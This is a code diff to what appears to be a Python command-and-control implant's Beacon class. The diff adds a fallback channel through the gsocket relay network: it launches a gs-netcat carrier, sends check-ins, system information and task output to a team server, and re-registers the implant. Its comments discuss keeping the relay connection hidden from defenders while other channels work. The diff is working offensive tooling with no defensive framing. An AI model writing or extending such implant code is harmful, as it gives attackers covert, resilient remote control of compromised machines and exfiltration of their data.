+                close_fds=True,
+                # Its own session, so a signal typed at whatever started
+                # this beacon does not reach the carrier before the beacon
+                # can take it down in order, and so `_gsocket_stop` can
+                # signal the whole group: a `gs-netcat` that spawned
+                # anything would otherwise leave it behind holding this
+                # implant's address on the relay network.
+                start_new_session=True)
+        except OSError as exc:
+            # Not latched: a host out of processes or descriptors is a
+            # state that passes, unlike a binary that is not there.
+            self._gsocket_proc = None
+            logger.debug("gsocket: could not exec %s: %s",
+                         self.gsocket_binary_path, exc)
+            self._record_leg("gsocket", _RESCUE_CLASSES["carrier_failed"])
+            return False
+
+        self._gsocket_starts += 1
+        self._gsocket_started_at = time.monotonic()
+        self._gsocket_ready_seen = False
+        logger.debug("gsocket: carrier started as pid %d, forward on "
+                     "127.0.0.1:%d", self._gsocket_proc.pid,
+                     self.gsocket_local_port)
+        return True
+
+    def _gsocket_forward_accepts(self) -> bool:
+        """Whether something accepts on the forward's port, right now."""
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(_GSOCKET_PROBE_TIMEOUT)
+        try:
+            sock.connect(("127.0.0.1", self.gsocket_local_port))
+            return True
+        except OSError:
+            return False
+        finally:
+            try:
+                sock.close()
+            except OSError:
+                pass
+
+    def _gsocket_ready(self) -> bool:
+        """Whether the carrier is up and its forward can be posted to.
+
+        Two things, in this order, and the order is what makes the answer
+        usable. The child first: a forward port that accepts while our
+        child is gone is somebody else's socket, and posting a check-in
+        into it would send this implant's envelope to whatever bound the
+        port. Then the forward itself.
+
+        `ready_timeout_seconds` bounds the wait, and the wait is rarer than
+        the setting's name suggests: the window is measured from the
+        carrier's start, so once it has closed this returns at once, and
+        once the forward has answered once it is not probed again. The
+        latch starts the carrier at the *end* of a failed cycle, a whole
+        beacon interval before the next one, so on the ordinary tasking
+        path the window has always closed and this costs one connect
+        attempt. The one place it really blocks is the fifth-failure
+        re-registration, which starts the carrier and then walks
+        `_registration_legs()` in the same pass. That is the warm
+        half of the latch -- the second outage pays nothing, because the
+        request about to go through the forward is a better probe than a
+        connect that is thrown away, and a connect-and-close on every
+        cycle would cost a relay session and a stray connection to the
+        team server's beacon socket for an answer the request is about to
+        give.
+        """
+        proc = self._gsocket_proc
+        if proc is None or proc.poll() is not None:
+            return False
+        if self._gsocket_ready_seen:
+            return True
+
+        deadline = (self._gsocket_started_at or time.monotonic()) \
+            + self.gsocket_ready_timeout_seconds
+        while True:
+            if proc.poll() is not None:
+                # The commonest way this leg fails on a real host: the
+                # forward's port is already taken, so `gs-netcat` exits
+                # at once. Answered here rather than waited out, because
+                # the window would otherwise be spent on a child that is
+                # already gone.
+                logger.debug("gsocket: the carrier exited with %s before its "
+                             "forward came up", proc.poll())
+                return False
+            if self._gsocket_forward_accepts():
+                self._gsocket_ready_seen = True
+                return True
+            if time.monotonic() >= deadline:
+                logger.debug("gsocket: the forward on 127.0.0.1:%d did not "
+                             "come up within %ds", self.gsocket_local_port,
+                             self.gsocket_ready_timeout_seconds)
+                return False
+            if not self._running:
+                # A stop arrived while we were waiting. `Beacon.stop`
+                # joins this thread for five seconds and a readiness
+                # window can be twenty, so a wait that ignored this would
+                # outlive the join and post a check-in through a forward
+                # the stop was about to take down.
+                return False
+            time.sleep(_GSOCKET_READY_POLL)
+
+    def _gsocket_stop(self) -> None:
+        """Take the carrier down. Called when the beacon stops, and there only.
+
+        Not part of the latch: the latch starts the carrier and never
+        stops it, which is what makes the second outage free. This exists
+        because a `gs-netcat` that outlived the beacon would hold this
+        implant's address on the relay network with nothing behind it, and
+        the team server's carrier would keep pairing with it -- the same
+        reason `Beacon.stop` takes the tunnel child with it.
+
+        Safe when nothing is running, and deliberately so: `Beacon.stop`
+        calls it without first working out whether a carrier was ever
+        started.
+        """
+        proc = self._gsocket_proc
+        self._gsocket_proc = None
+        self._gsocket_ready_seen = False
+        if proc is None or proc.poll() is not None:
+            return
+        logger.info("Beacon stopping: taking gsocket carrier pid %d with it",
+                    proc.pid)
+        self._gsocket_signal(proc, hard=False)
+        code, _ = self._child_ending(proc)
+        if code is None:
+            self._gsocket_signal(proc, hard=True)
+            code, ending = self._child_ending(proc)
+            if code is None:
+                # Nothing left to escalate to, so say so rather than
+                # returning as though the carrier were down: it still
+                # holds this implant's relay address.
+                logger.warning("gsocket carrier pid %d survived a terminate "
+                               "and a kill, and %s", proc.pid, ending)
+
+    @staticmethod
+    def _gsocket_signal(proc: subprocess.Popen, hard: bool) -> None:
+        """Signal the child's whole process group, or the child alone.
+
+        The group where there is one, because `start_new_session=True`
+        made the child a group leader and anything it spawned is in there
+        with it -- `gs-netcat` is a third-party binary and whether it
+        forks is not ours to assume. `signal` and `os.killpg` are imported
+        and reached for only on that path, for the reason
+        `_shell_modules` gives: `killpg` does not exist on Windows and
+        this file has to stay importable there, where `proc.terminate()`
+        and `proc.kill()` are the right calls anyway.
+
+        The fallbacks are the two races worth surviving: the child exited
+        between our `poll` and our signal, or its group is no longer ours
+        to signal.
+        """
+        if hasattr(os, "killpg") and hasattr(os, "getpgid"):
+            import signal
+
+            number = signal.SIGKILL if hard else signal.SIGTERM
+            try:
+                os.killpg(os.getpgid(proc.pid), number)
+                return
+            except ProcessLookupError:
+                return
+            except OSError:
+                pass
+        try:
+            if hard:
+                proc.kill()
+            else:
+                proc.terminate()
+        except OSError:
+            pass
+
+    def _beacon_gsocket(self) -> Optional[dict]:
+        """Check in through the carrier's forward.
+
+        The carrier is not started here. It is started where
+        `_beacon_loop` concludes that nothing delivered, which is *after*
+        this leg has been tried -- so on the cycle that discovers an
+        outage there is no carrier yet and this records `carrier_failed`.
+        That is deliberate and it is the operator's own decision: a
+        healthy implant holds no GSRN connection, so the first cycle of an
+        outage is the cycle that pays for bringing one up. The record says
+        the leg was reached and produced nothing, which is true, and the
+        alternative -- leaving it empty, which packs as `not_attempted` --
+        would tell an operator "GSOCKET: not tried" about the one leg
+        being brought up for them.
+        """
+        if not self._gsocket_ready():
+            self._record_leg("gsocket",
+                             self._gsocket_problem_class
+                             or _RESCUE_CLASSES["carrier_failed"])
+            return None
+        # Same shape as _beacon_smb and _beacon_quic, including the
+        # register-when-unregistered arm: a beacon whose HTTPS leg never
+        # came up has never registered, and this leg is bidirectional, so
+        # it can do it. `_system_info()` already carries "id" and
+        # "agent_id".
+        info = dict(self._system_info(),
+                    action="beacon" if self._registered else "register")
+        return self._https_post("beacon", info, base=self._gsocket_base(),
+                                transport="gsocket")
+
+    def _send_result_gsocket(self, task_id: str, status: str, output: str,
+                             data: Optional[dict] = None):
+        """Report one task's result through the forward.
+
+        Last in the result chain, as the leg is last in the tasking chain.
+        """
+        if not self._gsocket_ready():
+            self._record_leg("gsocket",
+                             self._gsocket_problem_class
+                             or _RESCUE_CLASSES["carrier_failed"])
+            return
+        result = {
+            "action": "result",
+            "agent_id": self._agent_id or self._implant_id,
+            "task_id": task_id,
+            "status": status,
+            "output": output,
+        }
+        if data:
+            result["data"] = data
+        self._https_post("result", result, base=self._gsocket_base(),
+                         transport="gsocket")
 
     # ── Command execution (pure Python for file ops, subprocess only for shell) ──
 
@@ -8381,6 +9231,19 @@ class Beacon:
                     sent = True
                 except Exception:
                     pass
+            if self.gsocket_enabled and not sent:
+                # Last, as the leg is last in the tasking chain, and for
+                # the same reason: it is the one that costs a child
+                # process. A result that reaches the server through the
+                # carrier is also the only way work tasked over the
+                # rescue gets reported at all, since DNS carries nothing
+                # out.
+                try:
+                    self._send_result_gsocket(task_id, status, output,
+                                              result_data)
+                    sent = True
+                except Exception:
+                    pass
 
     # ── Main loop ──
 
@@ -8390,10 +9253,31 @@ class Beacon:
             self._implant_id, self.interval, int(self.jitter * 100),
         )
 
-        if self.https_enabled:
+        # The preamble, and not an HTTPS one: it used to be gated on
+        # `https_enabled`, which was true enough while HTTPS was the only
+        # leg that carried a registration of its own. The configuration
+        # this beacon's fifth leg exists for is the one where HTTPS is
+        # off, and gated on it such an implant never registered at all --
+        # it never appeared in the fleet, and looked healthy from every
+        # other angle.
+        #
+        # Gated on there being something to try rather than attempted
+        # regardless: a walk of an empty chain would spend all ten
+        # attempts and ten backoff sleeps before the first cycle, and
+        # then warn about a registration nothing could have attempted. A
+        # gsocket-only implant is exactly that case at beacon start --
+        # its carrier is not up, because the latch and nothing else
+        # starts it -- so it skips this and registers from inside the
+        # loop instead, on the cycle after the latch brought the carrier
+        # up. See `_registration_legs`.
+        #
+        # One attempt is one walk of the chain, so for an HTTPS-only
+        # beacon the ten attempts, the backoff and the warning are
+        # exactly what they always were.
+        if self._registration_legs():
             attempts = 0
             while self._running and not self._registered and attempts < 10:
-                if self._register_https():
+                if self._register_upstream():
                     self._consecutive_failures = 0
                     break
                 attempts += 1
@@ -8433,15 +9317,30 @@ class Beacon:
                 tasking = self._beacon_smb()
                 if tasking is not None:
                     delivered_by = "smb"
-                if tasking and tasking.get("success"):
-                    self._registered = True
+                # Not `_registered = True`: the id the server assigned has
+                # to be adopted too, or every result afterwards is filed
+                # under the implant id and misses the agent's `history`.
+                # See `_adopt_registration`, which all four upstream legs
+                # share.
+                self._adopt_registration(tasking)
 
             if tasking is None and self.quic_enabled:
                 tasking = self._beacon_quic()
                 if tasking is not None:
                     delivered_by = "quic"
-                if tasking and tasking.get("success"):
-                    self._registered = True
+                self._adopt_registration(tasking)
+
+            if tasking is None and self.gsocket_enabled:
+                # Last, and it does not start the carrier: that happens
+                # below, once this cycle has concluded that nothing
+                # delivered. So the first cycle of an outage finds no
+                # carrier and records `carrier_failed`, which is the price
+                # of a healthy implant holding no connection to the relay
+                # network -- see `_beacon_gsocket`.
+                tasking = self._beacon_gsocket()
+                if tasking is not None:
+                    delivered_by = "gsocket"
+                self._adopt_registration(tasking)
 
             # Stuck means no *upstream* leg delivered -- not that nothing
             # came back. The team server's DNS tasking route answers with
@@ -8454,6 +9353,22 @@ class Beacon:
             # exists for. Receiving work over DNS is not getting out: the
             # results of that work cannot be reported either.
             if delivered_by not in _RESCUE_UPSTREAM:
+                # The gsocket leg's latch, and the only place the carrier
+                # is ever started. This is the operator's decision and not
+                # an optimisation: a healthy implant holds no connection
+                # to the Global Socket Relay Network at all, because that
+                # is a connection a defender can see and the four legs
+                # above were working. Once started it is never stopped, so
+                # the second outage costs no readiness wait.
+                #
+                # Before `_maybe_rescue` and not after: if the carrier
+                # cannot be started, the reason is the most useful thing
+                # the rescue can carry, and a start attempted afterwards
+                # would report it one cycle late. It is also the whole
+                # restart loop -- a cycle whose carrier died is a cycle
+                # where nothing delivered, so this is where it comes back.
+                if self.gsocket_enabled:
+                    self._gsocket_start()
                 # Resolved before the dispatch below, so an answer to the
                 # rescue runs like any other tasking: assigning it inside
                 # the failure arm would collect the operator's reply and
@@ -8467,7 +9382,16 @@ class Beacon:
                 if self._consecutive_failures > 0 and self._consecutive_failures % 5 == 0:
                     logger.info("Re-registering after %d failures", self._consecutive_failures)
                     self._registered = False
-                    self._register_https()
+                    # The same generalisation as the preamble, and for a
+                    # sharper reason: this called `_register_https`
+                    # whatever the configuration, so a beacon whose only
+                    # leg is gsocket posted to an empty callback URL and
+                    # filed an `https` failure into its own rescue record
+                    # -- a diagnostic about a leg the operator never
+                    # configured, sitting beside the real reason. The
+                    # fifth leg made "no HTTPS leg at all" a shipping
+                    # configuration for the first time.
+                    self._register_upstream()
             else:
                 self._consecutive_failures = 0
                 if delivered_by in _RESCUE_UPSTREAM:
@@ -8601,4 +9525,10 @@ class Beacon:
             logger.info("Beacon stopping: taking tunnel child pid %d with it",
                         self._tunnel_proc.pid)
             self._tunnel_stop()
+        # And the carrier, for a sharper reason: a `gs-netcat` left behind
+        # keeps this implant's address on the relay network occupied with
+        # nothing behind it, so the team server's carrier would pair with
+        # it on every check-in and the implant would look reachable while
+        # being gone.
+        self._gsocket_stop()
         logger.info("Beacon stopped")
